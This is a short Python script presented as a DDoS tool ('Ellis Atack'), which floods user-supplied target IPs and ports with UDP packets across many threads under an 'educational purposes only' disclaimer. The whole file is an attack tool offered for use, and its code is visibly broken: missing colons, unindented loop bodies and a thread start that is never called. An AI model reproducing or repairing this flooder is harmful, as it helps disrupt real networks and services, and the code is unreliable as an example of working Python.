import os 
import time
import socket
import scapy.all as scapy
import threading

def display_banner():
    banner =  "██████╗ ██████╗  ██████╗ ███████╗       █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗\n"
    banner += "██╔══██╗██╔══██╗██╔═══██╗██╔════╝      ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝\n"
    banner += "██║  ██║██║  ██║██║   ██║███████╗█████╗███████║   ██║      ██║   ███████║██║     █████╔╝\n"
    banner += "██║  ██║██║  ██║██║   ██║╚════██║╚════╝██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗\n"
    banner += "██████╔╝██████╔╝╚██████╔╝███████║      ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗\n"
    banner += "╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝      ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝\n"
    print(banner)


display_banner()


os.system('color 0A')
print("Developer  : Ellis Pierce")
print("Caution:   : Use this for educational purposes only!")
print()

mydate = time.strftime('%Y-%m-%d')
mytune = time.strftime('%H-%M')

def send_packets(ip, port, data, proxy_size)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sent = 0
    while True
        for i in range(proxy_size)
        sock.sendto(data, (ip, port))
        sent += 1
        port += 1
        if port == 65534
              port = 1



ips = input("IP TARGET (USE COMMAS): ").split(',')
ports = input("Ports (USE COMMAS): ").split(',')
proxy_size = int(input("Proxy Size: "))
threads = int(input("Number of threads : "))

print("Thank you for using Ellis Atack")

time.sleep(3)
for ip in ips:
     for port in ports:
          data = b'Hello, this is a DDOS attack'
          print("Starting the Attack on", ip, " at port ", port, "With a proxy size of", proxy_size, "...")
          for i in range(threads):
               t = threading.Thread(target=send_packets, args=(ip, int(port), data, proxy_size))
               t.start

    
if os.name == "nt": #windows
     os.system("cls")

else:
     os.system("clear")

input("Press enter to exit.")

